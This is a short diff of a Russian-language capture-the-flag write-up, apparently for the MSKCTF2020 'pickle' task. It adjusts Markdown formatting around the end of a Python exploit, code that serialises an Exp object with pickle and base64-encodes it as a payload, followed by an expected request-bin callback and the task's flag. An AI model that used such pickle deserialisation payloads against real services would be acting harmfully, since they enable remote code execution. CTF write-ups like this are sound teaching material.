@@ -37,9 +37,9 @@ class Exp(object):
 shellcode = pickle.dumps(Exp(), protocol=0)
 print(base64.b64encode(shellcode))
 ```
-
-В результате должен прийти такой запрос:
-<br/><br/>
+<br/>
+#### В результате должен прийти такой запрос:
+<br/>
 ![alt text](https://github.com/WATyag/MSKCTF2020/blob/master/pickle/requestbin.jpg "Request example")
-<br/><br/>
+<br/>
 #### Флаг: MSKCTF{pickle_cant_be_easily_secured} 
